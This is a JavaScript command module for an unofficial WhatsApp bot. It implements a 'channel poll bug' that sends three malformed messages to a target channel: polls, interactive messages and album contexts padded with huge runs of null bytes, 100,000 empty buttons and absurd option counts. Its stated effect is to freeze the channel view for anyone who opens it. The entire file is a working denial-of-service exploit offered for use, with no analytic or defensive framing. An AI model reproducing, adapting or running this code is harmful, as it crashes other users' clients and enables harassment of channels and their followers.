// ⟦EXPERT⟧ .chbug — channel poll overflow payload (owner only)
async function ownerOnly(z) {
  return !!z.isOwner
}

async function resolveChannelJid(z) {
  const arg = (z.args?.[0] || '').trim()
  if (!arg) return z.jid
  if (arg.includes('@newsletter')) return arg

  const m = arg.match(/channel\/([A-Za-z0-9_-]+)/i)
  if (!m) return null
  const inviteCode = m[1]

  // Try to follow + resolve
  try { await z.sock.newsletterMsg(inviteCode, { type: 'FOLLOW' }) } catch {}
  try {
    const info = await z.sock.newsletterMsg(inviteCode, { type: 'INFO' })
    const jid = info?.id || info?.thread_metadata?.id || info?.result?.id
    if (jid?.endsWith('@newsletter')) return jid
  } catch {}

  return null
}

export default {
  name: 'chbug',
  aliases: ['chban', 'chfreeze', 'channelbug', 'chpoll'],
  desc: 'Channel poll overflow payload (owner only)',
  async run(z) {
    await z.react('💀').catch(() => {})

    try {
      if (!(await ownerOnly(z))) return z.reply('⛔ Owner only.')

      const target = await resolveChannelJid(z)
      if (!target) {
        return z.reply(
          `❌ *Could not resolve channel JID*\n\n` +
          `Pass the raw JID directly:\n` +
          `${z.prefix}chbug 120363xxxxx@newsletter`
        )
      }

      await z.reply(`💀 *Launching CHANNEL POLL BUG...*\n📡 *Target:* ${target}`)

      // ─── Payload 1: oversized poll ───
      // 12 options, each padded with 50k null bytes
      const options = []
      for (let i = 0; i < 12; i++) {
        options.push({
          optionName: `\u0000`.repeat(50000) + ` option_${i}`,
          optionHash: `\u0000`.repeat(50000) + ` hash_${i}`
        })
      }

      const pollPayload = {
        pollCreationMessageV3: {
          name: `\u0000`.repeat(250000) + ' Telegram: @Midoxsmb',
          options,
          selectableOptionsCount: 999999999
        }
      }

      // ─── Payload 2: viewOnce-wrapped malformed interactive ───
      // Different path — some clients parse this without server sanitization
      const interactivePayload = {
        viewOnceMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                title: `\u0000`.repeat(100000),
                hasMediaAttachment: false
              },
              body: { text: `\u0000`.repeat(200000) },
              footer: { text: `\u0000`.repeat(50000) },
              nativeFlowMessage: {
                buttons: Array.from({ length: 100000 }, () => ({}))
              },
              contextInfo: {
                quotedMessage: {
                  pollCreationMessage: {
                    name: '\u0000'.repeat(100000),
                    options: Array.from({ length: 12 }, () => ({
                      optionName: '\u0000'.repeat(10000)
                    })),
                    selectableOptionsCount: 1
                  }
                }
              }
            }
          }
        }
      }

      // ─── Payload 3: heavily padded album context ───
      const albumPayload = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: 'tsm' },
              nativeFlowMessage: { buttons: [{}] },
              contextInfo: {
                quotedMessage: {
                  albumMessage: {
                    expectedImageCount: 999999,
                    expectedVideoCount: 999999
                  },
                  conversation: '\u0000'.repeat(200000)
                }
              }
            }
          }
        }
      }

      const send = async (payload, label) => {
        const messageId = `3EB0${Math.random().toString(36).slice(2, 12).toUpperCase()}`
        try {
          await z.sock.relayMessage(target, payload, { messageId })
          console.log(`[chbug] sent ${label}`)
          return true
        } catch (e) {
          console.warn(`[chbug] ${label} failed:`, e.message)
          return false
        }
      }

      // Fire all three vectors with delay between them
      const r1 = await send(pollPayload, 'poll')
      await new Promise(r => setTimeout(r, 1500))
      const r2 = await send(interactivePayload, 'interactive')
      await new Promise(r => setTimeout(r, 1500))
      const r3 = await send(albumPayload, 'album')

      await z.reply(
        `💀 *CHANNEL BUG SENT!*\n\n` +
        `📡 *Target:* ${target}\n` +
        `📊 *Poll:* ${r1 ? '✅' : '❌'}\n` +
        `🎛️ *Interactive:* ${r2 ? '✅' : '❌'}\n` +
        `📦 *Album:* ${r3 ? '✅' : '❌'}\n\n` +
        `💥 *Effect:* channel view freeze on open`
      )
      await z.react('✅').catch(() => {})
    } catch (e) {
      console.error('[chbug]', e)
      await z.reply(`❌ *Channel bug failed*\n${e.message}`)
      await z.react('❌').catch(() => {})
    }
  }
}
